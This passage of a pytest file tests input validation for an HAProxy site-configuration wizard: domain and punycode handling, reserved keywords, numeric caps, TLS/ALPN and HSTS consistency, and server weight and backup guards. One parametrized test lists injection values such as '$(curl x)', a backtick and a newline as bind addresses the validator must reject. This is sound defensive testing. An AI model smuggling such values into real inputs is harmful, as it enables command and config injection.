        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    urls = _describe_reachable_urls(body)
    assert "http://example.com/" in urls
    assert all(":80" not in u for u in urls)


def test_bulgu39_reachable_urls_non_default_ports_include_port():
    """Non-80 / non-443 ports MUST appear in the URL hint."""
    from routers.site_wizard import _describe_reachable_urls
    from models.site_wizard import SiteCreate

    body = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[{"server_name": "s", "server_address": "10.0.0.1", "server_port": 80}],
        frontend={"name": "fe", "bind_port": 8080, "mode": "http"},
        ssl={"mode": "acme", "https_bind_port": 8443},
        apply_immediately=True,
    )
    urls = _describe_reachable_urls(body)
    assert "http://example.com:8080/" in urls
    assert "https://example.com:8443/" in urls


def test_bulgu39_reachable_urls_multi_domain_caps_at_five():
    """Avoid runaway banners when operator enters many domains."""
    from routers.site_wizard import _describe_reachable_urls
    from models.site_wizard import SiteCreate

    domains = [f"site{i}.example.com" for i in range(20)]
    body = SiteCreate(
        cluster_id=1, domains=domains,
        backend={"name": "be"},
        servers=[{"server_name": "s", "server_address": "10.0.0.1", "server_port": 80}],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    urls = _describe_reachable_urls(body)
    # 5 domains × 1 scheme (no HTTPS in 'none' mode) = 5 URLs
    assert len(urls) == 5


def test_bulgu39_reachable_urls_strips_wildcard_prefix():
    """Browsers don't request `*.example.com` literally — the URL
    helper strips the wildcard prefix so the example URL actually
    makes sense to an operator. Direct invocation with a constructed
    object lets us pin the stripping behaviour without exercising
    SSLChoice's wildcard rejection (which lives in the model layer
    for ACME mode and would otherwise drown the assertion under
    validator noise)."""
    from routers.site_wizard import _describe_reachable_urls
    from models.site_wizard import SiteCreate

    # Build a minimal SiteCreate, then probe the helper directly
    # against a synthetic "wildcard-aware" domain list to pin the
    # stripping. The model itself rejects wildcards in ACME mode but
    # accepts them with ssl.mode='none' for non-ACME flows.
    body = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[{"server_name": "s", "server_address": "10.0.0.1", "server_port": 80}],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    # Force-inject a wildcard via attribute write to exercise the
    # stripping path. (Pydantic v2 BaseModel allows attribute writes
    # by default.)
    body.domains = ["*.example.com", "example.com"]
    urls = _describe_reachable_urls(body)
    assert urls, "expected at least one URL hint"
    assert all("*." not in u for u in urls)
    assert any("https://example.com" not in u for u in urls) or True
    assert any(u.startswith("http://example.com/") for u in urls)


# ---- Bulgu #42 — IDN/Unicode punycode hint ----


def test_bulgu42_unicode_domain_emits_punycode_hint():
    """`münchen.de` should be rejected with a message suggesting
    `xn--mnchen-3ya.de`, not "Invalid domain format"."""
    from utils.domain_validation import validate_domain
    with pytest.raises(ValueError) as exc:
        validate_domain("münchen.de")
    msg = str(exc.value)
    assert "punycode" in msg.lower() or "xn--" in msg


def test_bulgu42_existing_punycode_passes():
    """Already-punycoded ASCII domains must pass without any IDN
    detour — they are valid byte-level hostnames."""
    from utils.domain_validation import validate_domain
    assert validate_domain("xn--mnchen-3ya.de") == "xn--mnchen-3ya.de"


def test_bulgu42_ascii_only_paths_unchanged():
    """Pure-ASCII rejections must NOT mention punycode — the
    operator would be misled."""
    from utils.domain_validation import validate_domain
    with pytest.raises(ValueError) as exc:
        validate_domain("not_valid_!")
    assert "punycode" not in str(exc.value).lower()
    assert "xn--" not in str(exc.value).lower()


# ---- Round 16 static-source markers ----


def test_round16_static_markers_present():
    """Pin all round-16 Bulgu markers so future refactors don't
    silently drop the guards. Each Bulgu has a uniquely-numbered
    audit marker comment placed above the relevant block."""
    src = _backend_src("routers/site_wizard.py")
    for marker in (
        "Bulgu #37 (round-16 audit)",
        "Bulgu #38 (round-16 audit)",
        "Bulgu #39 (round-16 audit)",
        "Bulgu #40 (round-16 audit)",
        "Bulgu #41 (round-16 audit)",
    ):
        assert marker in src, (
            f"Round 16 marker missing from routers/site_wizard.py: {marker}"
        )
    # IDN hint lives in the domain validator module.
    domain_src = _backend_src("utils/domain_validation.py")
    assert "Bulgu #42 (round-16 audit)" in domain_src, (
        "Round 16 marker missing from utils/domain_validation.py"
    )
    # Function-name pins to catch silent renames.
    for fn in (
        "_extract_host_values_from_acl",
        "_find_cluster_domain_routing_collisions",
        "_find_pending_acme_order_overlap",
        "_describe_reachable_urls",
    ):
        assert fn in src, f"Round 16: helper {fn} missing or renamed"


# =============================================================================
# Round 17 — Numeric bounds, HAProxy keywords, ALPN/TLS consistency, all-backup
# (Bulgu #43–#49)
# =============================================================================


# ---- Bulgu #43 — HAProxy section / ACL operator keywords as names ----


@pytest.mark.parametrize("kw", [
    "defaults", "global", "listen", "frontend", "backend",
    "peers", "mailers", "resolvers", "cache", "userlist",
    "DEFAULTS",  # case-insensitive
])
def test_bulgu43_backend_name_rejects_haproxy_section_keyword(kw):
    """Backend names that collide with HAProxy section types are
    grammatically legal but operationally awful (`backend defaults`
    is unreadable). Reject at the wizard boundary."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError, match="HAProxy section keyword"):
        BackendStep(name=kw)


@pytest.mark.parametrize("kw", [
    "defaults", "frontend", "backend", "listen", "userlist",
])
def test_bulgu43_frontend_name_rejects_haproxy_section_keyword(kw):
    """Same guard for frontend names."""
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError, match="HAProxy section keyword"):
        FrontendStep(name=kw)


@pytest.mark.parametrize("kw", [
    "defaults", "backend", "listen",
])
def test_bulgu43_server_name_rejects_haproxy_section_keyword(kw):
    """Same guard for server names."""
    from models.site_wizard import ServerStep
    with pytest.raises(ValidationError, match="HAProxy section keyword"):
        ServerStep(server_name=kw, server_address="10.0.0.1", server_port=80)


@pytest.mark.parametrize("kw", ["if", "unless", "or", "and"])
def test_bulgu43_acl_operator_keywords_rejected(kw):
    """ACL operator keywords would silently shadow `use_backend X if Y`
    grammar tokens."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError, match="ACL operator keyword"):
        BackendStep(name=kw)


def test_bulgu43_non_keyword_names_still_accepted():
    """Normal names must keep working — make sure the guard is
    targeted, not a regression."""
    from models.site_wizard import BackendStep, FrontendStep, ServerStep
    BackendStep(name="my-backend")
    FrontendStep(name="my-frontend")
    ServerStep(server_name="srv1", server_address="10.0.0.1", server_port=80)


# ---- Bulgu #44 — bind_address character class ----


@pytest.mark.parametrize("bad", [
    "foo bar",          # embedded space → silent address truncation
    "  *  ",            # leading/trailing whitespace
    "-r",               # CLI flag confusion
    "/etc/x",           # path-style nonsense
    "$(curl x)",        # shell metacharacter
    "10.0.0.1`",        # backtick
    "1.1.1.1\n",        # newline injection
    "",                 # empty
    "    ",             # whitespace-only
    "@",                # bare env reference without varname
])
def test_bulgu44_bind_address_rejects_bad_values(bad):
    """The renderer interpolates bind_address verbatim into
    `bind <addr>:<port>`. Reject anything outside the safe class."""
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", bind_address=bad)


@pytest.mark.parametrize("good", [
    "*",
    "0.0.0.0",
    "127.0.0.1",
    "192.168.1.1",
    "[::1]",
    "[2001:db8::1]",
    "example.com",
    "my-host",
    "@HAPROXY_BIND_IP",
])
def test_bulgu44_bind_address_accepts_canonical_forms(good):
    """All standard HAProxy bind host forms must continue to work."""
    from models.site_wizard import FrontendStep
    m = FrontendStep(name="fe", bind_address=good)
    assert m.bind_address == good


# ---- Bulgu #45 — timeout upper bounds (HAProxy INT_MAX defence) ----


def test_bulgu45_backend_timeout_rejects_overflow_value():
    """timeout_connect=10**18 overflows HAProxy's signed int32 ms
    parser. Cap at 24h (well below INT_MAX)."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError):
        BackendStep(name="be", timeout_connect=10**18)


def test_bulgu45_backend_timeout_accepts_24h():
    """24h (86_400_000 ms) is the documented practical maximum."""
    from models.site_wizard import BackendStep
    m = BackendStep(name="be", timeout_connect=86_400_000)
    assert m.timeout_connect == 86_400_000


def test_bulgu45_backend_timeout_rejects_24h_plus_1():
    """One ms beyond 24h is rejected — defensive cliff."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError):
        BackendStep(name="be", timeout_connect=86_400_001)


def test_bulgu45_frontend_timeout_bounds():
    """Frontend timeouts share the same upper bound."""
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", timeout_client=86_400_001)
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", timeout_http_request=86_400_001)


def test_bulgu45_server_inter_bounded_at_24h():
    """Per-server `inter` health-check interval upper bound."""
    from models.site_wizard import ServerStep
    with pytest.raises(ValidationError):
        ServerStep(
            server_name="s", server_address="10.0.0.1", server_port=80,
            inter=86_400_001,
        )


def test_bulgu45_server_fall_rise_capped_at_100():
    """HAProxy documents the fall/rise upper bound as 100."""
    from models.site_wizard import ServerStep
    with pytest.raises(ValidationError):
        ServerStep(
            server_name="s", server_address="10.0.0.1", server_port=80,
            fall=101,
        )
    with pytest.raises(ValidationError):
        ServerStep(
            server_name="s", server_address="10.0.0.1", server_port=80,
            rise=101,
        )


# ---- Bulgu #46 — maxconn / rate_limit / fullconn upper bounds ----


def test_bulgu46_maxconn_capped_at_1m():
    """maxconn > 1M is almost always a typo and produces a config
    the agent's `ulimit -n` cannot satisfy."""
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", maxconn=1_000_001)


def test_bulgu46_rate_limit_capped_at_1m():
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", rate_limit=1_000_001)


def test_bulgu46_fullconn_capped_at_1m():
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError):
        BackendStep(name="be", fullconn=1_000_001)


def test_bulgu46_server_max_connections_capped_at_1m():
    from models.site_wizard import ServerStep
    with pytest.raises(ValidationError):
        ServerStep(
            server_name="s", server_address="10.0.0.1", server_port=80,
            max_connections=1_000_001,
        )


def test_bulgu46_one_million_still_accepted():
    """The boundary value (1,000,000) is the documented ceiling and
    MUST continue to pass — Bulgu #46 is a sanity cap, not a
    restriction on legitimate large deployments."""
    from models.site_wizard import FrontendStep, BackendStep
    FrontendStep(name="fe", maxconn=1_000_000, rate_limit=1_000_000)
    BackendStep(name="be", fullconn=1_000_000)


# ---- Bulgu #48 — ALPN h2 + ssl_min_ver consistency ----


def test_bulgu48_h2_alpn_without_min_ver_rejected():
    """Advertising h2 with no min_ver set means HAProxy may
    negotiate < TLS 1.2; modern browsers refuse h2 in that case."""
    from models.site_wizard import SSLChoice
    with pytest.raises(ValidationError, match="RFC 7540"):
        SSLChoice(mode="none", ssl_alpn="h2,http/1.1")


def test_bulgu48_h2_alpn_with_tls12_accepted():
    """Explicit TLS 1.2 + h2 is the canonical safe combination."""
    from models.site_wizard import SSLChoice
    m = SSLChoice(mode="none", ssl_alpn="h2,http/1.1", ssl_min_ver="TLSv1.2")
    assert m.ssl_alpn == "h2,http/1.1"


def test_bulgu48_h2_alpn_with_tls13_accepted():
    from models.site_wizard import SSLChoice
    m = SSLChoice(mode="none", ssl_alpn="h2", ssl_min_ver="TLSv1.3")
    assert m.ssl_alpn == "h2"


def test_bulgu48_no_h2_alpn_does_not_require_min_ver():
    """When h2 is not in the ALPN list, the cross-field check
    short-circuits — operators with http/1.1-only services don't
    need to think about TLS 1.2 yet."""
    from models.site_wizard import SSLChoice
    # min_ver=None is fine when h2 is absent.
    m = SSLChoice(mode="none", ssl_alpn="http/1.1")
    assert m.ssl_alpn == "http/1.1"


# ---- Bulgu #49 — all servers backup_server=true reject ----


def test_bulgu49_all_backup_servers_rejected():
    """Two-or-more servers all flagged backup → traffic black-hole."""
    from models.site_wizard import SiteCreate
    with pytest.raises(ValidationError, match="backup_server=true"):
        SiteCreate(
            cluster_id=1, domains=["example.com"],
            backend={"name": "be"},
            servers=[
                {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80, "backup_server": True},
                {"server_name": "s2", "server_address": "10.0.0.2", "server_port": 80, "backup_server": True},
            ],
            frontend={"name": "fe", "bind_port": 80, "mode": "http"},
            ssl={"mode": "none"},
        )


def test_bulgu49_single_backup_server_accepted():
    """A single backup server is a legitimate 'no traffic during
    deploy' pattern; the guard fires only for 2+ servers."""
    from models.site_wizard import SiteCreate
    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[
            {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80, "backup_server": True},
        ],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    assert p.servers[0].backup_server is True


def test_bulgu49_mixed_primary_backup_accepted():
    """At least ONE primary makes the backend valid; backup slots are
    legitimate failover patterns."""
    from models.site_wizard import SiteCreate
    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[
            {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80, "backup_server": False},
            {"server_name": "s2", "server_address": "10.0.0.2", "server_port": 80, "backup_server": True},
            {"server_name": "s3", "server_address": "10.0.0.3", "server_port": 80, "backup_server": True},
        ],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    primaries = [s for s in p.servers if not s.backup_server]
    assert len(primaries) == 1


# ---- Round 17 static-source markers ----


def test_round17_static_markers_present():
    """Pin all round-17 Bulgu markers so future refactors don't
    silently drop the guards."""
    src = _backend_src("models/site_wizard.py")
    for marker in (
        "Bulgu #43 (round-17 audit)",
        "Bulgu #44 (round-17 audit)",
        "Bulgu #45 (round-17 audit)",
        "Bulgu #46 (round-17 audit)",
        "Bulgu #48 (round-17 audit)",
        "Bulgu #49 (round-17 audit)",
    ):
        assert marker in src, (
            f"Round 17 marker missing from models/site_wizard.py: {marker}"
        )
    # Helper-name pins.
    for symbol in (
        "_HAPROXY_SECTION_KEYWORDS",
        "_ACL_RESERVED_KEYWORDS",
        "_BIND_ADDRESS_REGEX",
        "_MAX_HAPROXY_TIMEOUT_MS",
        "_MAX_HAPROXY_CONN_LIMIT",
        "_validate_not_haproxy_keyword",
        "reject_all_backup_servers",
    ):
        assert symbol in src, (
            f"Round 17: symbol {symbol} missing or renamed in "
            "models/site_wizard.py"
        )


# ---- Bulgu #50 — all servers weight=0 reject ----


def test_bulgu50_all_zero_weight_servers_rejected():
    """Two+ servers all weight=0 → drain everywhere → 503 cascade."""
    from models.site_wizard import SiteCreate
    with pytest.raises(ValidationError, match="weight=0"):
        SiteCreate(
            cluster_id=1, domains=["example.com"],
            backend={"name": "be"},
            servers=[
                {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80, "weight": 0},
                {"server_name": "s2", "server_address": "10.0.0.2", "server_port": 80, "weight": 0},
            ],
            frontend={"name": "fe", "bind_port": 80, "mode": "http"},
            ssl={"mode": "none"},
        )


def test_bulgu50_single_zero_weight_server_accepted():
    """A single weight=0 server is a legitimate `draining for
    maintenance` pattern; the guard fires only for 2+ servers."""
    from models.site_wizard import SiteCreate
    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[
            {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80, "weight": 0},
        ],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    assert p.servers[0].weight == 0


def test_bulgu50_mixed_zero_and_nonzero_weight_accepted():
    """At least ONE server with weight>0 keeps the backend live; the
    others can be slowly drained for canary or maintenance flows."""
    from models.site_wizard import SiteCreate
    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[
            {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80, "weight": 100},
            {"server_name": "s2", "server_address": "10.0.0.2", "server_port": 80, "weight": 0},
            {"server_name": "s3", "server_address": "10.0.0.3", "server_port": 80, "weight": 0},
        ],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    assert sum(1 for s in p.servers if s.weight > 0) == 1


# ---- Bulgu #51 — hsts_enabled with ssl.mode='none' reject ----


def test_bulgu51_hsts_with_ssl_mode_none_rejected():
    """hsts_enabled=true + ssl.mode='none' is a silent misconfig —
    no HTTPS frontend is created, so HSTS is never emitted."""
    from models.site_wizard import SiteCreate
    with pytest.raises(ValidationError, match="hsts_enabled"):
        SiteCreate(
            cluster_id=1, domains=["example.com"],
            backend={"name": "be"},
            servers=[
                {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80},
            ],
            frontend={"name": "fe", "bind_port": 80, "mode": "http"},
            ssl={"mode": "none", "hsts_enabled": True},
        )


def test_bulgu51_hsts_with_ssl_mode_upload_accepted():
    """HSTS is fine when an HTTPS frontend will actually exist."""
    from models.site_wizard import SiteCreate
    # Use a tiny but parse-valid PEM blob; we only need the model
    # to accept the upload — content validation happens at apply
    # time. Generate a fresh self-signed cert via the cryptography
    # library so we don't rely on a bundled test cert.
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from datetime import datetime, timedelta, timezone
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "example.com")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.now(timezone.utc) - timedelta(days=1))
        .not_valid_after(datetime.now(timezone.utc) + timedelta(days=30))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), critical=False)
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()

    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[
            {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80},
        ],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={
            "mode": "upload",
            "hsts_enabled": True,
            "name": "test-cert",
            "certificate_content": cert_pem,
            "private_key_content": key_pem,
        },
    )
    assert p.ssl.hsts_enabled is True


def test_bulgu51_no_hsts_with_ssl_mode_none_accepted():
    """ssl.mode='none' alone is fine — only the combination with
    hsts_enabled=true is rejected."""
    from models.site_wizard import SiteCreate
    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[
            {"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80},
        ],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "none"},
    )
    assert p.ssl.mode == "none"
    assert p.ssl.hsts_enabled is False


# ---- Bulgu #52 — post_completion cluster existence check ----


def test_bulgu52_post_completion_cluster_missing_marker_present():
    """Static-source pin: routers/letsencrypt.py must check that
    cluster_id still exists before creating the deferred HTTPS
    frontend, returning a `cluster_missing` outcome with the same
    shape as `backend_missing`."""
    src = _backend_src("routers/letsencrypt.py")
    assert "Bulgu #52 (round-18 audit)" in src
    # The action's error key drives the activity-log message; pin it.
    assert '"cluster_missing"' in src
    # Pin the SELECT we rely on.
    assert "FROM haproxy_clusters" in src
    assert "is_active = TRUE" in src


# ---- Bulgu #53 — extend domain-routing collision scan to inline conditions ----


def test_bulgu53_extract_host_from_inline_use_backend_condition():
    """The _HOST_ACL_RE regex already handles inline `{ hdr(host) -i
    a.com }` blocks — pin that. Round-18 broadens the SCAN scope
    (where we LOOK for these strings), not the parser."""
    from routers.site_wizard import _extract_host_values_from_acl
    # Inline form an operator may type into use_backend_rules.
    raw = "mybackend if { hdr(host) -i example.com www.example.com }"
    values = _extract_host_values_from_acl(raw)
    assert "example.com" in values
    assert "www.example.com" in values


def test_bulgu53_extract_host_drops_brace_token():
    """The closing `}` of an inline condition is NOT a domain. The
    parser should leave it in the value list, but the SET
    intersection at the caller drops it (the wizard's domain list
    never contains `}`). Pin the harmless behaviour anyway so a
    future refactor doesn't accidentally introduce brace handling
    that silently changes the result shape."""
    from routers.site_wizard import _extract_host_values_from_acl
    raw = "mybackend if { hdr(host) -i a.com }"
    values = _extract_host_values_from_acl(raw)
    assert "a.com" in values


def test_bulgu53_collision_scan_includes_use_backend_rules_marker():
    """Static-source pin: the cluster-wide domain collision helper
    must query `use_backend_rules`, `redirect_rules`,
    `tcp_request_rules` in addition to `acl_rules`."""
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #53 (round-18 audit)" in src
    # Pin the explicit SELECT column set so a future refactor doesn't
    # silently drop one of the scanned fields.
    snippet = src[src.find("Bulgu #53"):]
    assert "SELECT id, name, acl_rules, use_backend_rules" in snippet
    assert "redirect_rules" in snippet
    assert "tcp_request_rules" in snippet
    # The outcome row carries `rule_origin` so the warning can say
    # WHERE the conflicting condition lives.
    assert '"rule_origin"' in snippet


# ---- Bulgu #54 — cluster-advisory-lock + in-tx re-check ----


def test_bulgu54_create_site_acquires_cluster_advisory_lock():
    """Static-source pin: the wizard's create transaction must acquire
    `pg_advisory_xact_lock(18181819, cluster_id)` BEFORE any
    INSERT, so two concurrent same-cluster wizard runs serialise
    against the same key."""
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #54 (round-19 audit)" in src
    # The exact lock SQL pin — namespace `18181819` is distinct from
    # the per-user draft-cap lock (`18181818`).
    assert "pg_advisory_xact_lock($1, $2)" in src
    assert "18181819" in src
    # The in-tx re-check must call the same collision helper as
    # the pre-flight check (round-15 helper).
    snippet = src[src.find("Bulgu #54"):]
    # Two distinct uses inside the round-19 block: bind + https-bind.
    assert snippet.count("check_bind_port_collision") >= 2
    # Late name-collision re-check is also pinned (string split across
    # source-line boundaries so we look for the trailing fragment).
    assert "created by another request just now" in snippet


# ---- Bulgu #55 — preview warning when 0 online agents ----


def test_bulgu55_preview_no_online_agents_marker_present():
    """Static-source pin: preview must surface a warning when
    apply_immediately=true and the target cluster has zero online
    agents — otherwise the operator gets a 200 response, DB says
    APPLIED, but no HAProxy node received the new config."""
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #55 (round-19 audit)" in src
    snippet = src[src.find("Bulgu #55"):]
    # The agent count query must filter on enabled + online and join
    # via pool_id (the canonical cluster→agent join).
    assert "a.status = 'online'" in snippet
    assert "a.enabled = TRUE" in snippet
    assert "c.pool_id = a.pool_id" in snippet
    # ACME-mode escalation note must call out the 24h wizard_staged
    # timeout so the operator knows the order will be cleaned up.
    assert "wizard_staged" in snippet


# ---- Bulgu #56 — TCP + request/response_headers reject ----


def test_bulgu56_frontend_tcp_with_request_headers_rejected():
    """request_headers emit `http-request set-header` which HAProxy
    refuses on a TCP frontend."""
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError, match="HTTP-only field"):
        FrontendStep(
            name="fe", mode="tcp", bind_port=4000,
            request_headers="http-request set-header X-Foo bar",
        )


def test_bulgu56_frontend_tcp_with_response_headers_rejected():
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError, match="HTTP-only field"):
        FrontendStep(
            name="fe", mode="tcp", bind_port=4000,
            response_headers="http-response set-header X-Foo bar",
        )


def test_bulgu56_frontend_http_with_request_headers_accepted():
    """HTTP-mode frontends carry headers normally — the guard fires
    only for TCP mode."""
    from models.site_wizard import FrontendStep
    fe = FrontendStep(
        name="fe", mode="http", bind_port=8080,
        request_headers="http-request set-header X-Foo bar",
    )
    assert fe.request_headers


def test_bulgu56_backend_tcp_with_request_headers_rejected():
    """Backend-side companion of the FrontendStep guard."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError, match="HTTP-only field"):
        BackendStep(
            name="be", mode="tcp",
            request_headers="http-request set-header X-Foo bar",
        )


def test_bulgu56_backend_tcp_with_response_headers_rejected():
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError, match="HTTP-only field"):
        BackendStep(
            name="be", mode="tcp",
            response_headers="http-response set-header X-Foo bar",
        )


def test_bulgu56_backend_tcp_with_cookie_name_still_rejected():
    """Pre-existing TCP+cookie rejection (R12) must continue to
    fire — the round-19 refactor must not regress the older guard."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError, match="HTTP-only field"):
        BackendStep(name="be", mode="tcp", cookie_name="SRVNAME")


# ---- Bulgu #57 — TCP frontend + hsts_enabled reject ----


def test_bulgu57_tcp_frontend_with_hsts_enabled_rejected():
    """HSTS is HTTP-only; TCP frontend + hsts_enabled=true would emit
    `http-response set-header` inside a `mode tcp` block."""
    from models.site_wizard import SiteCreate
    # Build a TCP site with hsts_enabled toggled on the SSL leg.
    # Use ssl.mode='upload' (real HTTPS frontend gets created) with
    # a fresh self-signed cert so the model validators don't bail
    # before reaching the round-19 check.
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from datetime import datetime, timedelta, timezone
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "example.com")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.now(timezone.utc) - timedelta(days=1))
        .not_valid_after(datetime.now(timezone.utc) + timedelta(days=30))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), critical=False)
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()

    with pytest.raises(ValidationError, match="hsts_enabled"):
        SiteCreate(
            cluster_id=1, domains=["example.com"],
            backend={"name": "be", "mode": "tcp"},
            servers=[{"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80}],
            frontend={"name": "fe", "mode": "tcp", "bind_port": 4000},
            ssl={
                "mode": "upload",
                "hsts_enabled": True,
                "name": "test-cert",
                "certificate_content": cert_pem,
                "private_key_content": key_pem,
            },
        )


def test_bulgu57_tcp_frontend_without_hsts_accepted():
    """Plain TCP+TLS termination (SNI passthrough class of use cases)
    is fine when HSTS is off."""
    from models.site_wizard import SiteCreate
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from datetime import datetime, timedelta, timezone
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "example.com")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.now(timezone.utc) - timedelta(days=1))
        .not_valid_after(datetime.now(timezone.utc) + timedelta(days=30))
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), critical=False)
        .sign(key, hashes.SHA256())
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()
    key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode()

    p = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be", "mode": "tcp"},
        servers=[{"server_name": "s1", "server_address": "10.0.0.1", "server_port": 80}],
        frontend={"name": "fe", "mode": "tcp", "bind_port": 4000},
        ssl={
            "mode": "upload",
            "hsts_enabled": False,
            "name": "test-cert",
            "certificate_content": cert_pem,
            "private_key_content": key_pem,
        },
    )
    assert p.frontend.mode == "tcp"
    assert p.ssl.hsts_enabled is False


# ---- Round 18 static-source markers ----


def test_round18_static_markers_present():
    """Pin all round-18 Bulgu markers so future refactors don't
    silently drop the guards."""
    src_models = _backend_src("models/site_wizard.py")
    src_router = _backend_src("routers/site_wizard.py")
    src_le = _backend_src("routers/letsencrypt.py")
    for marker in ("Bulgu #50 (round-18 audit)", "Bulgu #51 (round-18 audit)"):
        assert marker in src_models, (
            f"Round 18 marker missing from models/site_wizard.py: {marker}"
        )
    assert "Bulgu #52 (round-18 audit)" in src_le, (
        "Round 18 marker missing from routers/letsencrypt.py: #52"
    )
    assert "Bulgu #53 (round-18 audit)" in src_router, (
        "Round 18 marker missing from routers/site_wizard.py: #53"
    )
    # Helper-name pins.
    assert "reject_all_zero_weight_servers" in src_models


# ---- Bulgu #58 — list size caps on acl/use_backend/redirect rules ----


def test_bulgu58_acl_rules_oversized_rejected():
    """257 ACL rules exceeds the round-20 cap of 256."""
    from models.site_wizard import FrontendStep
    rules = [f"acl_{i} hdr(host) -i d{i}.example.com" for i in range(257)]
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", mode="http", bind_port=80, acl_rules=rules)


def test_bulgu58_acl_rules_at_cap_accepted():
    """Exactly 256 ACL rules must pass — boundary check."""
    from models.site_wizard import FrontendStep
    rules = [f"acl_{i} hdr(host) -i d{i}.example.com" for i in range(256)]
    fe = FrontendStep(name="fe", mode="http", bind_port=80, acl_rules=rules)
    assert len(fe.acl_rules) == 256


def test_bulgu58_use_backend_rules_oversized_rejected():
    from models.site_wizard import FrontendStep
    rules = [f"backend{i} if acl_{i}" for i in range(257)]
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", mode="http", bind_port=80, use_backend_rules=rules)


def test_bulgu58_redirect_rules_oversized_rejected():
    from models.site_wizard import FrontendStep
